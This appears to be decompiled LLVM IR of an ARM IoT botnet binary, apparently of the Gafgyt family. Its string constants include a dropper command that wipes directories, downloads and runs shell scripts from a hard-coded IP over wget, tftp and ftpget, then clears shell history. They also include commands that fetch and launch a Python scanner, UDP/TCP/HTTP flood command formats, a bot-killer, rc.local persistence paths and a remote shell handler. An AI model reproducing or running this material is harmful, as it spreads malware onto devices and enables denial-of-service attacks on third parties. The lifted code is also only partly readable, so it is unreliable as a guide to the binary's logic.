([134 x i8], [134 x i8]* @global_var_2194c.820, i32 0, i32 0), i8* getelementptr inbounds ([131 x i8], [131 x i8]* @global_var_20fa0.798, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @global_var_21024.799, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @global_var_1fd14.745, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @global_var_2013c.757, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_21078.800, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @global_var_210e8.801, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @global_var_204a4.767, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_21180.802, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_219d4.821, i32 0, i32 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @global_var_21a20.822, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_21a38.823, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_21aac.824, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @global_var_21b20.825, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @global_var_211cc.803, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @global_var_2124c.804, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @global_var_212cc.805, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @global_var_2134c.806, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @global_var_213cc.807, i32 0, i32 0), i8* getelementptr inbounds ([126 x i8], [126 x i8]* @global_var_2144c.808, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @global_var_214cc.809, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @global_var_21544.810, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @global_var_215b0.811, i32 0, i32 0), i8* getelementptr inbounds ([127 x i8], [127 x i8]* @global_var_21624.812, i32 0, i32 0), i8* getelementptr inbounds ([59 x i8], [59 x i8]* @global_var_216a4.813, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_1b210.525, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_1fe14.748, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @global_var_216e0.814, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @global_var_21728.815, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @global_var_1fae0.740, i32 0, i32 0), i8* getelementptr inbounds ([208 x i8], [208 x i8]* @global_var_2176c.816, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_2183c.817, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @global_var_1f45c.723, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @global_var_21898.818, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @global_var_1f7b4.732, i32 0, i32 0)]
@global_var_1b1a8.828 = constant [6 x i8] c"close\00"
@global_var_1b1b0.829 = constant [11 x i8] c"keep-alive\00"
@global_var_1b1bc.830 = constant [7 x i8] c"accept\00"
@global_var_1b1c4.831 = constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1b1a8.828, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1b1b0.829, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1b1bc.830, i32 0, i32 0)]
@global_var_225b4.835 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_225f4.837 = constant [443 x i8] c"cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://207.148.12.91/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 207.148.12.91 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 207.148.12.91; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 207.148.12.91 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c\00"
@global_var_227b0.839 = constant [4 x i8] c"%d\0A\00"
@global_var_227b4.841 = constant [7 x i8] c"PYTHON\00"
@global_var_227bc.843 = constant [8 x i8] c"INSTALL\00"
@global_var_227c4.845 = constant [131 x i8] c"sudo yum install python-paramiko -y;sudo apt-get install python-paramiko -y;sudo mkdir /.tmp/;cd /.tmp;wget 207.148.12.91/good2.py\00"
@global_var_22848.848 = constant [26 x i8] c"INSTALLING PYTHON SCANNER\00"
@global_var_22864.850 = constant [7 x i8] c"UPDATE\00"
@global_var_2286c.852 = constant [48 x i8] c"cd /.tmp;rm -rf *py;wget 207.148.12.91/good2.py\00"
@global_var_2289c.854 = constant [24 x i8] c"UPDATING PYTHON SCANNER\00"
@global_var_228b4.856 = constant [4 x i8] c"OFF\00"
@global_var_228b8.858 = constant [31 x i8] c"killall -9 python;pkill python\00"
@global_var_228d8.860 = constant [24 x i8] c"STOPPING PYTHON SCANNER\00"
@global_var_228f0.862 = constant [6 x i8] c"START\00"
@global_var_228f8.864 = constant [40 x i8] c"cd /.tmp;python good2.py 1000 LUCKY 1 3\00"
@global_var_22920.866 = constant [28 x i8] c"STARTING VOIDS HACKA SCANNA\00"
@global_var_2293c.869 = constant [6 x i8] c"PONG!\00"
@global_var_22944.871 = constant [6 x i8] c"TABLE\00"
@global_var_2294c.873 = constant [3 x i8] c"%d\00"
@global_var_22950.875 = constant [25 x i8] c"UPDATE TAKEN SUCCESFULLY\00"
@global_var_2296c.877 = constant [8 x i8] c"SCANNER\00"
@global_var_32b8c.879 = global i32 0
@global_var_22974.881 = constant [17 x i8] c"STOPPING SCANNER\00"
@global_var_22988.883 = constant [3 x i8] c"ON\00"
@global_var_2298c.886 = constant [26 x i8] c"STARTING SCANNER ON -> %s\00"
@global_var_229a8.888 = constant [6 x i8] c"NETIS\00"
@global_var_229b0.890 = constant [23 x i8] c"STOPPING NETIS SCANNER\00"
@global_var_229c8.892 = constant [23 x i8] c"STARTING NETIS SCANNER\00"
@global_var_229e0.894 = constant [8 x i8] c"REMOVER\00"
@global_var_229e8.896 = constant [29 x i8] c"COMMENCING BOT KILL ON -> %s\00"
@global_var_22a08.898 = constant [12 x i8] c"GETPUBLICIP\00"
@global_var_22a14.900 = constant [17 x i8] c"My Public IP: %s\00"
@global_var_22a28.902 = constant [4 x i8] c"UDP\00"
@global_var_22a2c.904 = constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00"
@global_var_22aa0.907 = constant [4 x i8] c"TCP\00"
@global_var_22aa4.909 = constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00"
@global_var_22b60.911 = constant [5 x i8] c"HTTP\00"
@global_var_22b68.913 = constant [4 x i8] c"CNC\00"
@global_var_22b6c.915 = constant [27 x i8] c"CNC <target> <port> <time>\00"
@global_var_22b88.917 = constant [4 x i8] c"STD\00"
@global_var_22b8c.919 = constant [27 x i8] c"STD <target> <port> <time>\00"
@global_var_22ba8.921 = constant [9 x i8] c"KILLATTK\00"
@global_var_22bb4.926 = constant [11 x i8] c"Killed %d.\00"
@global_var_22bc0.928 = constant [13 x i8] c"None Killed.\00"
@global_var_22bd0.930 = constant [10 x i8] c"LOLNOGTFO\00"
@global_var_2c484.933 = local_unnamed_addr global i32 -1
@global_var_2c480.935 = global [18 x i8]* @global_var_19ff0.504
@global_var_22bdc.937 = constant [8 x i8] c"8.8.8.8\00"
@global_var_22be4.940 = constant [16 x i8] c"/proc/net/route\00"
@global_var_22bf4.942 = constant [11 x i8] c"\0900000000\09\00"
@global_var_2c918.944 = global i32 0
@global_var_22c00.946 = constant [7 x i8] c"Device\00"
@global_var_22c08.948 = constant i32 0
@global_var_22c0c.950 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@1 = constant i32 114
@global_var_22c24.954 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_22c34.956 = constant i32 47
@global_var_22c38.958 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_22c40.960 = constant i32 97
@global_var_22c44.962 = constant [13 x i8] c"fork failed\0A\00"
@global_var_22c54.966 = constant [16 x i8] c"Connected %s:%s\00"
@global_var_22c64.971 = constant [5 x i8] c"PONG\00"
@global_var_22c6c.973 = constant [4 x i8] c"DUP\00"
@global_var_22c70.975 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_22c84.977 = constant [3 x i8] c"SH\00"
@global_var_22c88.979 = constant [8 x i8] c"%s 2>&1\00"
@global_var_22c90.981 = constant [3 x i8] c"%s\00"
@global_var_22c94.983 = constant i32 32
@global_var_32b4c.985 = global i32 0
@global_var_2c58c = external global i32
@global_var_2c594 = external local_unnamed_addr global i32
@global_var_32b5c.995 = global i32 0
@global_var_2c5c8.1001 = global i32 0
@global_var_30928.1003 = global i32 0
@global_var_14ed0.1005 = constant i32 -481296384
@global_var_122dc.1006 = constant i32 -442564544
@global_var_3092c.1008 = global i32 0
@global_var_20003.1012 = constant [131 x i8] c" (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)\00"
@global_var_20000.1013 = constant [134 x i8] c"4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)\00"
@global_var_2c5e0.1016 = global i32 2
@global_var_2c5b0.1022 = global i32 0
@global_var_126d0.1023 = constant i32 -442564492
@global_var_2c5ac.1025 = global i32* bitcast (i8** @global_var_2c5e4.990 to i32*)
@global_var_23298.1031 = constant i32 0
@global_var_12890.1036 = constant i32 -382910448
@global_var_166b8.1037 = constant i32 -382909968
@global_var_16774.1042 = constant i32 -382910224
@global_var_232cc.1044 = constant i32 135270416
@global_var_232b0.1046 = constant [6 x i8] c"(nil)\00"
@global_var_232b8.1049 = constant [7 x i8] c"(null)\00"
@global_var_232c0.1051 = constant i32 2949163
@global_var_2334c.1054 = constant i32 16843008
@global_var_23334.1056 = constant i32 327688
@global_var_2332c.1061 = constant [8 x i8] c" +0-#'I\00"
@global_var_232d4.1063 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_23314.1065 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_23307.1067 = constant i32 117506048
@global_var_23308.1069 = constant i32 252117248
@global_var_232f8.1071 = constant i32 331776
@global_var_232e8.1073 = constant i32 335616
@global_var_13e9c.1105 = constant i32 -456978431
@global_var_23368.1111 = constant [8 x i8] c"Success\00"
@global_var_23358.1113 = constant [15 x i8] c"Unknown error \00"
@global_var_24006.1115 = constant i32 65536
@global_var_2c8c8.1116 = global i32* @global_var_24006.1115
@global_var_32930.1119 = global i32 0
@global_var_32934.1122 = global i32 0
@global_var_32b10.1124 = global i32 0
@global_var_32944.1126 = global i32 0
@global_var_2c8d0.1128 = global i32 0
@global_var_32c48.1133 = global i32 0
@global_var_32c3c.1136 = global i32 0
@global_var_32b94.1138 = global i32 0
@global_var_32b24.1140 = global i32 0
@global_var_2c7d0.1143 = global i32 256
@global_var_2c6d4.1144 = global i32* @global_var_2c7d0.1143
@global_var_32c14.1148 = global i32 0
@global_var_164fc.1149 = constant i32 -382910416
@global_var_14f50.1156 = constant i32 -442564520
@global_var_2c7dc.1162 = global i32 0
@global_var_120a8.1164 = constant i32 -481230848
@global_var_32b3c.1166 = global i32 0
@global_var_11c94.1168 = constant i32 -509587456
@global_var_2c7f4.1170 = global i32 0
@global_var_2c80c = external global i32
@global_var_2c82c.1176 = global i32 -1726662223
@global_var_2c814.1183 = local_unnamed_addr global i32* @global_var_2c82c.1176
@global_var_2c810.1185 = global i32* @global_var_2c82c.1176
@global_var_23ec4.1199 = constant i32 0
@global_var_1f31d.1203 = constant [96 x i8] c"20100101 Firefox/33.0Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_23eec.1207 = constant [8 x i8] c"/bin/sh\00"
@global_var_23ef4.1209 = constant [3 x i8] c"sh\00"
@global_var_23ef8.1211 = constant [3 x i8] c"-c\00"
@global_var_2c8a8.1215 = global i32 0
@global_var_32b40.1219 = local_unnamed_addr global i32 0
@global_var_127d8.1222 = constant i32 -382910416
@global_var_32b48.1224 = global i32 0
@global_var_2c304.1228 = global i32 -1
@global_var_32b50.1231 = global i32 0
@global_var_32b54.1233 = local_unnamed_addr global i32 0
@global_var_15fc0.1234 = constant i32 -390234096
@global_var_23efc.1236 = constant [10 x i8] c"/dev/null\00"
@global_var_32b58.1238 = global i32 0
@global_var_12758.1242 = constant i32 -382909968
@global_var_32b44.1244 = local_unnamed_addr global i32 0
@global_var_13e10.1247 = constant [3 x i8] c"J\0D\00"
@global_var_2c8c0 = external local_unnamed_addr global i32
@global_var_121a8.1258 = constant i32 -442564608
@global_var_16288.1260 = constant i32 -335544720
@global_var_163c0.1263 = constant i32 -275775369
@global_var_32b80.1265 = global i32 0
@global_var_32b60.1267 = global i32 0
@global_var_24208.1269 = constant [4 x i8] c"inf\00"
@global_var_2420b.1273 = constant i32 1179535616
@global_var_24218.1275 = constant i32 2883630
@global_var_13aa0.1277 = constant i32 -382908944
@global_var_32b64.1285 = global i32 0
@global_var_32b7c.1290 = local_unnamed_addr global i32 0
@global_var_11ce8.1295 = constant i32 -382910448
@global_var_32c4c.1298 = global i32 0
@global_var_24264.1300 = constant i32 46
@global_var_32c2c.1302 = global i32 0
@global_var_181c4.1304 = constant i32 -369098656
@global_var_24268.1311 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_2427c.1313 = constant i32 114
@global_var_24280.1315 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_24298.1318 = constant [11 x i8] c"nameserver\00"
@global_var_242a4.1321 = constant [7 x i8] c"domain\00"
@global_var_242ac.1323 = constant [7 x i8] c"search\00"
@global_var_32c50.1328 = global i32 0
@global_var_32c54.1330 = global i32 0
@global_var_242c8.1339 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_242b4.1341 = constant i32 0
@global_var_242dc.1344 = constant [3 x i8] c"%x\00"
@global_var_242e0.1347 = constant [11 x i8] c"/etc/hosts\00"
@global_var_242ec.1349 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_2c308.1353 = global i32 0
@global_var_2c8ec.5 = external global i8*
@global_var_2c91e.79 = external global i8*
@global_var_2c91f.80 = local_unnamed_addr global i8 0
@global_var_2c920.81 = local_unnamed_addr global i8 0
@global_var_2c921.82 = local_unnamed_addr global i8 0
@global_var_2c922.83 = local_unnamed_addr global i8 0
@2 = internal constant [3 x i8] c" \01\00"
@global_var_2c5e4.990 = global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @2, i32 0, i32 0)
@global_var_2c634.991 = local_unnamed_addr global i8 16
@global_var_15fd4.997 = constant i8 0
@global_var_2c5e5.1028 = local_unnamed_addr global i8 1
@global_var_2c635.1029 = local_unnamed_addr global i8 1
@3 = internal constant [2 x i8] c"\01\00"
@global_var_2c8cc.1292 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @3, i32 0, i32 0)
@global_var_2c8cd.1293 = local_unnamed_addr global i8 0
@global_var_22c20.952 = constant [2 x i8] c"r\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  %v0_80a0 = call i32 @frame_dummy()
  store i32 %v0_80a0, i32* @r0, align 4
  %v1_80a4 = call i32 @__do_global_ctors_aux(i32 %v0_80a0)
  call void @__pseudo_branch(i32 %v3_8098)
  ret i32 %v1_80a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_80b0 = load i32, i32* @r4, align 4
  store i32 %v3_80b0, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_2c8ec.5 to i32), i32* %r5.global-to-local, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_2c8ec.5 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_80c0 = load i32, i32* @r0, align 4
  ret i32 %v12_80c0

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_2c320.8 to i32), i32* %r4.global-to-local, align 4
  %v2_80c8 = load i32, i32* bitcast (i32** @global_var_2c320.8 to i32*), align 4
  store i32 %v2_80c8, i32* %r2.global-to-local, align 4
  %v2_80d0 = icmp eq i32 %v2_80c8, 0
  br i1 %v2_80d0, label %bb8, label %dec_label_pc_80d8

dec_label_pc_80d8:                                ; preds = %bb7, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge
  %v1_80dc = phi i32 [ %v1_80dc.pre, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ ptrtoint (i32** @global_var_2c320.8 to i32), %bb7 ]
  %v0_80d8 = phi i32 [ %v2_80e8, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ %v2_80c8, %bb7 ]
  %v1_80d8 = add i32 %v0_80d8, 4
  %v2_80dc = inttoptr i32 %v1_80dc to i32*
  store i32 %v1_80d8, i32* %v2_80dc, align 4
  %v0_80e4 = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v2_80e8 = load i32, i32* bitcast (i32** @global_var_2c320.8 to i32*), align 4
  store i32 %v2_80e8, i32* %r2.global-to-local, align 4
  %v2_80f0 = icmp eq i32 %v2_80e8, 0
  br i1 %v2_80f0, label %.loopexit, label %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge

dec_label_pc_80d8.dec_label_pc_80d8_crit_edge:    ; preds = %dec_label_pc_80d8
  %v1_80dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_80d8

.loopexit:                                        ; preds = %dec_label_pc_80d8
  %v2_8110.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8110 = phi i32 [ %v2_8110.pre, %.loopexit ], [ ptrtoint (i8** @global_var_2c8ec.5 to i32), %bb7 ]
  %v3_8110 = inttoptr i32 %v2_8110 to i8*
  store i8 1, i8* %v3_8110, align 1
  %v2_8114 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8114, i32* %r4.global-to-local, align 4
  %v11_8114 = load i32, i32* @r0, align 4
  ret i32 %v11_8114

; uselistorder directives
  uselistorder i32 %v2_80e8, { 1, 2, 0 }
  uselistorder i32** @global_var_2c320.8, { 1, 0 }
  uselistorder i8** @global_var_2c8ec.5, { 1, 0 }
  uselistorder label %dec_label_pc_80d8, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v5_812c = load i32, i32* @r0, align 4
  ret i32 %v5_812c
}

define i32 @frame_dummy() local_unnamed_addr {
.thread:
  %v2_8150 = load i32, i32* @global_var_2c314.18, align 4
  %v2_8154 = icmp eq i32 %v2_8150, 0
  br i1 %v2_8154, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_2c314.18 to i32)

bb2:                                              ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_2c314.18 to i32)

; uselistorder directives
  uselistorder i32* @global_var_2c314.18, { 1, 0 }
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v5_818c = load i32, i32* @r0, align 4
  ret i32 %v5_818c
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8198 = ptrtoint i32* %stack_var_4 to i32
  %v8_81b8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_10be0.22 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 105860, i32 %arg1, i32 %v4_8198)
  %v0_81bc = call i32 @abort()
  ret i32 %v0_81bc
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_81dc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_81dc, i32* @global_var_2c924.25, align 4
  %v1_81fc = add i32 %v0_81dc, -1640531527
  store i32 %v1_81fc, i32* @global_var_2c928.26, align 4
  %v1_8218 = add i32 %v0_81dc, 1013904242
  store i32 %v1_8218, i32* @global_var_2c92c.27, align 4
  br label %dec_label_pc_8230

dec_label_pc_8230:                                ; preds = %entry, %dec_label_pc_8230
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_8274, %dec_label_pc_8230 ]
  store i32 %storemerge12, i32* %r0.global-to-local, align 4
  %tmp = mul i32 %storemerge12, 4
  %v5_8240 = add i32 %tmp, add (i32 ptrtoint (i32* @global_var_2c924.25 to i32), i32 -12)
  %v6_8240 = inttoptr i32 %v5_8240 to i32*
  %v7_8240 = load i32, i32* %v6_8240, align 4
  %tmp9 = mul i32 %storemerge12, 4
  %v5_8250 = add i32 %tmp9, add (i32 ptrtoint (i32* @global_var_2c924.25 to i32), i32 -8)
  %v6_8250 = inttoptr i32 %v5_8250 to i32*
  %v7_8250 = load i32, i32* %v6_8250, align 4
  %v2_8254 = xor i32 %storemerge12, -1640531527
  %v2_825c = xor i32 %v2_8254, %v7_8240
  %v2_8264 = xor i32 %v2_825c, %v7_8250
  %v5_826c = mul nuw nsw i32 %storemerge12, 4
  %v6_826c = add i32 %v5_826c, ptrtoint (i32* @global_var_2c924.25 to i32)
  %v7_826c = inttoptr i32 %v6_826c to i32*
  store i32 %v2_8264, i32* %v7_826c, align 4
  %v1_8274 = add nuw nsw i32 %storemerge12, 1
  %v7_828c = icmp slt i32 %v1_8274, 4096
  br i1 %v7_828c, label %dec_label_pc_8230, label %dec_label_pc_8290

dec_label_pc_8290:                                ; preds = %dec_label_pc_8230
  %v9_8294 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v9_8294

; uselistorder directives
  uselistorder i32 %storemerge12, { 5, 3, 2, 0, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8230, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_82a0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_82a0, i32* @ip, align 4
  %v2_82d0 = load i32, i32* @global_var_2c584.30, align 4
  %v1_82d4 = add i32 %v2_82d0, 1
  %v3_82dc = urem i32 %v1_82d4, 4096
  store i32 %v3_82dc, i32* @global_var_2c584.30, align 4
  %v4_82f4 = mul nuw nsw i32 %v3_82dc, 4
  %v5_82f4 = add i32 %v4_82f4, ptrtoint (i32* @global_var_2c924.25 to i32)
  %v6_82f4 = inttoptr i32 %v5_82f4 to i32*
  %v7_82f4 = load i32, i32* %v6_82f4, align 4
  %v2_830c = mul i32 %v7_82f4, 18782
  store i32 %v2_830c, i32* %r1.global-to-local, align 4
  %v2_8324 = load i32, i32* @global_var_2c580.33, align 4
  %v2_832c = add i32 %v2_8324, %v2_830c
  %v3_832c = icmp ult i32 %v2_832c, %v2_8324
  %v4_8330 = zext i1 %v3_832c to i32
  %v2_8360 = add i32 %v4_8330, %v2_832c
  %v3_8374 = icmp ult i32 %v2_8360, %v4_8330
  br i1 %v3_8374, label %dec_label_pc_837c, label %dec_label_pc_839c

dec_label_pc_837c:                                ; preds = %entry
  %v1_8380 = add i32 %v2_8360, 1
  %v1_8390 = select i1 %v3_832c, i32 2, i32 1
  br label %dec_label_pc_839c

dec_label_pc_839c:                                ; preds = %entry, %dec_label_pc_837c
  %storemerge = phi i32 [ %v1_8390, %dec_label_pc_837c ], [ %v4_8330, %entry ]
  %stack_var_-28.0 = phi i32 [ %v1_8380, %dec_label_pc_837c ], [ %v2_8360, %entry ]
  store i32 %storemerge, i32* @global_var_2c580.33, align 4
  store i32 %v3_82dc, i32* %r1.global-to-local, align 4
  %v2_83ac = sub i32 -2, %stack_var_-28.0
  store i32 %v2_83ac, i32* %v6_82f4, align 4
  %v1_83bc = load i32, i32* %r1.global-to-local, align 4
  %v4_83bc = mul i32 %v1_83bc, 4
  %v5_83bc = add i32 %v4_83bc, ptrtoint (i32* @global_var_2c924.25 to i32)
  %v6_83bc = inttoptr i32 %v5_83bc to i32*
  %v7_83bc = load i32, i32* %v6_83bc, align 4
  ret i32 %v7_83bc

; uselistorder directives
  uselistorder i32 %v4_8330, { 0, 2, 1 }
  uselistorder i32 %v2_8324, { 1, 0 }
  uselistorder i32 %v3_82dc, { 2, 1, 0 }
  uselistorder i32* @global_var_2c924.25, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2c924.25 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_839c, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i8*, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_83d8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_83d8, i32* @ip, align 4
  store i8* %arg1, i8** %stack_var_-32, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_83f8 = call i32 @strlen(i8* %arg1)
  store i32 %v3_83f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8418

dec_label_pc_8418:                                ; preds = %dec_label_pc_8418, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_8410, %dec_label_pc_8418 ]
  %v3_8420 = load i8*, i8** %stack_var_-32, align 4
  %v4_8420 = ptrtoint i8* %v3_8420 to i32
  %v2_8424 = add i32 %v4_8420, %stack_var_-24.0
  %v1_8428 = inttoptr i32 %v2_8424 to i8*
  %v2_8428 = load i8, i8* %v1_8428, align 1
  %v3_8428 = zext i8 %v2_8428 to i32
  store i32 %v3_8428, i32* %r0.global-to-local, align 4
  %v1_8430 = call i32 @isspace(i32 %v3_8428)
  store i32 %v1_8430, i32* %r0.global-to-local, align 4
  %v2_8438 = icmp eq i32 %v1_8430, 0
  %v1_8410 = add i32 %stack_var_-24.0, 1
  br i1 %v2_8438, label %dec_label_pc_8450.preheader, label %dec_label_pc_8418

dec_label_pc_8450.preheader:                      ; preds = %dec_label_pc_8418
  %v1_8400 = add i32 %v3_83f8, -1
  %v5_845c10 = icmp slt i32 %v1_8400, %stack_var_-24.0
  br i1 %v5_845c10, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8460

dec_label_pc_8444:                                ; preds = %dec_label_pc_8460
  %v1_8448 = add i32 %stack_var_-20.011, -1
  %v5_845c = icmp slt i32 %v1_8448, %stack_var_-24.0
  br i1 %v5_845c, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8460

dec_label_pc_8460:                                ; preds = %dec_label_pc_8450.preheader, %dec_label_pc_8444
  %stack_var_-20.011 = phi i32 [ %v1_8448, %dec_label_pc_8444 ], [ %v1_8400, %dec_label_pc_8450.preheader ]
  %v3_8468 = load i8*, i8** %stack_var_-32, align 4
  %v4_8468 = ptrtoint i8* %v3_8468 to i32
  %v2_846c = add i32 %v4_8468, %stack_var_-20.011
  %v1_8470 = inttoptr i32 %v2_846c to i8*
  %v2_8470 = load i8, i8* %v1_8470, align 1
  %v3_8470 = zext i8 %v2_8470 to i32
  store i32 %v3_8470, i32* %r0.global-to-local, align 4
  %v1_8478 = call i32 @isspace(i32 %v3_8470)
  store i32 %v1_8478, i32* %r0.global-to-local, align 4
  %v2_8480 = icmp eq i32 %v1_8478, 0
  br i1 %v2_8480, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8444

dec_label_pc_84d0.preheader:                      ; preds = %dec_label_pc_8444, %dec_label_pc_8460, %dec_label_pc_8450.preheader
  %stack_var_-20.0.lcssa = phi i32 [ %v1_8400, %dec_label_pc_8450.preheader ], [ %v1_8448, %dec_label_pc_8444 ], [ %stack_var_-20.011, %dec_label_pc_8460 ]
  br label %dec_label_pc_84d0

dec_label_pc_8494:                                ; preds = %dec_label_pc_84d0
  %v2_84b8 = add i32 %v4_84f0, %storemerge1
  %v1_84bc = inttoptr i32 %v2_84b8 to i8*
  %v2_84bc = load i8, i8* %v1_84bc, align 1
  %v3_84c0 = inttoptr i32 %v2_84f4 to i8*
  store i8 %v2_84bc, i8* %v3_84c0, align 1
  %v1_84c8 = add i32 %storemerge1, 1
  br label %dec_label_pc_84d0

